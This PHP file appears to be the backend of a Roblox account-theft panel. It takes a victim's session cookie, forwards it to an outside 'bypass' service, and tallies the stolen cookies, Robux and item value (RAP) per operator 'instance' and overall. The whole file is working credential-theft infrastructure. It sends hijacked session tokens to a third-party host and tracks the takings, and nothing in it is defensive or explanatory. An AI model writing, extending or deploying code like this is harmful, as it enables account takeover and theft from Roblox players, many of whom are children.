<?php
header('Content-Type: application/json');
error_reporting(0);

require_once '../config.php';
require_once '../functions.php';

// Get cookie from request
$cookie = $_POST['cookie'] ?? $_GET['cookie'] ?? '';
$instance = $_POST['instance'] ?? $_GET['instance'] ?? '';

if (empty($cookie)) {
    http_response_code(400);
    echo json_encode([
        'success' => false,
        'error' => 'No cookie provided'
    ]);
    exit;
}

// Call external bypass API
$externalApiUrl = 'https://rblxbypasser.com/api/bypass';
$postData = json_encode(['cookie' => $cookie]);

$ch = curl_init($externalApiUrl);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_POSTFIELDS, $postData);
curl_setopt($ch, CURLOPT_HTTPHEADER, ['Content-Type: application/json']);
curl_setopt($ch, CURLOPT_TIMEOUT, 30);
$response = curl_exec($ch);
$httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
$curlError = curl_error($ch);
curl_close($ch);

// Check if external API call failed
if ($httpCode !== 200 || !empty($curlError)) {
    http_response_code(400);
    echo json_encode([
        'success' => false, 
        'error' => 'Request Failed',
        'message' => 'Failed to process request. Make sure your cookie is valid and refreshed.'
    ]);
    exit;
}

// Parse the response from external API
$externalData = json_decode($response, true);

// Check if external API returned error or invalid data
if (!isset($externalData['success']) || !$externalData['success']) {
    http_response_code(400);
    echo json_encode([
        'success' => false, 
        'error' => 'Request Failed',
        'message' => 'Failed to process request. Make sure your cookie is valid.'
    ]);
    exit;
}

// Update instance stats if instance is provided
if (!empty($instance)) {
    $instanceData = getInstanceData($instance);
    if ($instanceData) {
        $instanceData['stats']['totalCookies']++;
        
        $userInfo = $externalData['userInfo'] ?? [];
        if (isset($userInfo['robux'])) {
            $instanceData['stats']['totalRobux'] += intval($userInfo['robux']);
        }
        if (isset($userInfo['rap'])) {
            $instanceData['stats']['totalRAP'] += intval($userInfo['rap']);
        }
        
        $today = date('w');
        $instanceData['dailyStats']['cookies'][$today]++;
        if (isset($userInfo['robux'])) {
            $instanceData['dailyStats']['robux'][$today] += intval($userInfo['robux']);
        }
        if (isset($userInfo['rap'])) {
            $instanceData['dailyStats']['rap'][$today] += intval($userInfo['rap']);
        }
        
        saveInstanceData($instance, $instanceData);
    }
}

// Update global stats
updateGlobalStats('totalCookies');

// Return the external API response as-is
echo json_encode($externalData);
?>
